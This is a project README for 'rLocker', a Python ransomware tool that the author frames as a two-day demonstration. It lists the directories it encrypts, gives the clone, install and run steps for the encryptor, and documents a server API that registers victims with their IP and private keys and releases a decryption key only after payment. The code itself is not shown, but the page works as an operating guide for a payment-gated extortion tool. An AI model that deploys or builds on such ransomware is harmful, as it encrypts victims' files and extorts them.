
# rLocker

rLocker (RSA Locker) is a ransomware tool built in python. It uses the RSA encryption standard to encrypt a computers `C:\Users` files and `C:\Program Files` and `C:\Program Files (x86)`. Your key pair is stored on a [mongoDB](https://www.mongodb.com) database. rLocker communicates with a mainserver API to allow for restricted database access.

rLocker was made with the purpose to find out how easy writing malware can be, and how simple ransomware can devastate a system. rLocker was made over the course of 2 days, so there is likely a lot of bugs. But it serves its purpose to demonstrate the power of cryptography.

rLocker is the encryptor, with dLocker being the decryptor. A file called uuid.rlocker will be created when you have used rlocker, do not delete this file! This file
contains your UUID and it can be difficult to decrupt the files without it!


## Running the code

To use the tools, first clone the repository

```bash
  git clone https://github.com/Ironislife98/rLocker.git
```

Then install the dependencies

```bash
  pip install -r requirements.txt
```

Then run the encryptor

```bash
  python rlocker.python
```

#### Don't do anything without explicit permission



## API Reference

#### Add New Victim

```http
  GET /add/${uuid}/${ip}/${privatekey}/${publickey}
```

| Parameter | Type     | Description                |
| :-------- | :------- | :------------------------- |
| `uuid` | `string` | **Required**. Your unique user id |
| `ip`   | `string  | **Required**. Your ip address |
| `privatekey`   | `string  | **Required**. Your RSA private key |
| `publickey`   | `string  | **Required**. Your RSA public key |


#### Get Key

```http
  GET /getkey/${uuid}
```

| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `uuid`      | `string` | **Required**. Unique user id of victim |

Returns key if victim has paid, else returns *Payment not complete!*

#### Get new UUID for victim
```http
  GET /newid
```

Returns a UUID for victim.

#### Paid Status

```http
  GET /paidstatus/${uuid}
```

| Parameter | Type     | Description                       |
| :-------- | :------- | :-------------------------------- |
| `uuid`      | `string` | **Required**. Unique user id of victim |

Returns status of victims payment, *True* or *False*

## Demo

![rLocker Demo](https://github.com/Ironislife98/rLocker/blob/b18a457e20b7398f76e07198fbc6b4b557a78e37/Images/demo.png?raw=true "rLocker Demo")


## Authors

- [@Ironislife98](https://www.github.com/Ironislife98)

